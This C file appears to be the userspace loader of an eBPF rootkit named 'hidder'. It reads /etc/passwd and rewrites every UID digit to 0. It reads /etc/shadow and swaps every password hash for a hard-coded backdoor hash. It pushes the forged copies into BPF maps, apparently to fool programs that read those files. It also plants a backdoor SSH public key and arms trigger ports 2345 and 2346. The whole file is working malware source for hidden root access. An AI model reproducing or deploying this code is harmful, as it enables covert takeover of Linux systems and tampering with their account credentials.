#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>
#include <bpf/bpf.h>


#include "hidder.skel.h"

char backdoor_publickey[] = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHgLzgvt+dvcDklpa1+j0fiaodAaHIP552JCnmDw00to";
char backdoor_hashed_passwd[] = "$6$a$WURSl9l0w.6ozNrOYJOTooNhEM03emqmdNIgu8oSwzJxM.gyGCnRGqUsecNA3sRz.sJi6HwnI1yiX5yugU2/R1"; // lol

struct hidder_bpf *skel;
struct file_block {
    char buff[8192];
    int buff_len;
};

static void int_exit(int sig)
{
	hidder_bpf__destroy(skel);
	exit(0);
}

static int get_passwd_backdoor(char *buff, int buff_len)
{
    int passwd_fd = open("/etc/passwd", O_RDONLY);
    if (passwd_fd < 0) {
        fprintf(stderr, "Failed to open /etc/passwd\n");
        return -1;
    }
    int ret = read(passwd_fd, buff, buff_len);
    if (ret < 0) {
        fprintf(stderr, "Failed to read /etc/passwd\n");
        return -1;
    }
    if (ret == buff_len && buff[buff_len - 1] != '\0') {
        fprintf(stderr, "passwd file is too long, crank up the buffer size\n");
        return -1;
    }
    close(passwd_fd);

    for (int i = 0; i < ret; i++) {
        if (buff[i] >= '1' && buff[i] <= '9') {
            buff[i] = '0';
        }
    }

    return ret;
}

static int get_shadow_backdoor(char *buff, int buff_len)
{
    int shadow_fd = open("/etc/shadow", O_RDONLY);
    if (shadow_fd < 0) {
        fprintf(stderr, "Failed to open /etc/shadow\n");
        return -1;
    }
    int ret = read(shadow_fd, buff, buff_len);
    if (ret < 0) {
        fprintf(stderr, "Failed to read /etc/shadow\n");
        return -1;
    }
    if (ret == buff_len && buff[buff_len - 1] != '\0') {
        fprintf(stderr, "shadow file is too long, crank up the buffer size\n");
        return -1;
    }
    close(shadow_fd);

    for (int i = 0; i < ret; i++) {
        if (buff[i] == '$') {
            // We need to know the passwd length (so until we find the next ':' )
            int j = i;
            while (j < ret && buff[j] != ':') {
                j++;
            }
            if (j < ret) {
                // We found the next ':'
                int passwd_len = j - i;
                // apply the backdoor passwd
                memcpy(buff + i, backdoor_hashed_passwd, strlen(backdoor_hashed_passwd));
                // we need to shift the rest of the string to the left
                int offset = passwd_len - strlen(backdoor_hashed_passwd);
                // using memmove to handle overlapping memory
                memmove(buff + i + strlen(backdoor_hashed_passwd), buff + j, ret - j + 1);
                // update ret
                ret -= offset;
                i = j;
            }
        }
    }

    return ret;
}

int set_altered_file(char *buffer, int buffer_len, int position)
{
    const int pos = position;
    int files_fd = bpf_map__fd(skel->maps.files_elem);
    if (files_fd < 0) {
        printf("Failed to get files_fd\n");
        return -1;
    }
    if (buffer_len > 8192) {
        printf("passwd_len is too long\n");
        return -1;
    }
    struct file_block passwd_block = {
        .buff_len = buffer_len,
        .buff = {0}
    };
    memcpy(passwd_block.buff, buffer, buffer_len);
    return bpf_map_update_elem(files_fd, &pos, &passwd_block, 0);
}

int set_backdoor_pubkey(char *pubkey, int pubkey_len)
{
    const int zero = 0;
    int auth_fd = bpf_map__fd(skel->maps.auth_elem);
    if (auth_fd < 0) {
        printf("Failed to get auth_fd\n");
        return -1;
    }
    if (pubkey_len > 256) {
        printf("pubkey_len is too long\n");
        return -1;
    }
    return bpf_map_update_elem(auth_fd, &zero, pubkey, 0);
}

int set_port(unsigned short port, int backdoor_type)
{
    // update maps
    int port_fd = bpf_map__fd(skel->maps.trigger_ports);
    if (port_fd < 0) {
        fprintf(stderr, "Failed to get port_fd\n");
        return -1;
    }
    if (port == 0) {
        return bpf_map_delete_elem(port_fd, &port);
    }
    return bpf_map_update_elem(port_fd, &port, &backdoor_type, 0);
}

int main(int argc, char **argv)
{
    int err;

    skel = hidder_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    err = hidder_bpf__load(skel);
    if (err) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
    }

    err = hidder_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton\n");
    }

    // Get passwd and shadow
    char passwd_buff[8192], shadow_buff[8192];
    get_passwd_backdoor(passwd_buff, sizeof(passwd_buff));
    get_shadow_backdoor(shadow_buff, sizeof(shadow_buff));

    // Set altered files
    set_altered_file(passwd_buff, strlen(passwd_buff), 0);
    set_altered_file(shadow_buff, strlen(shadow_buff), 1);

    // Set backdoor settings
    set_backdoor_pubkey(backdoor_publickey, sizeof(backdoor_publickey));
    set_port(2345, 1); // backdoor auth
    set_port(2346, 2); // backdoor passwd
    

    signal(SIGINT, int_exit);
    signal(SIGTERM, int_exit);
    printf("hidder_bpf loaded successfully.\n");
    while (1) {
        sleep(2);
    }
    return 0;
}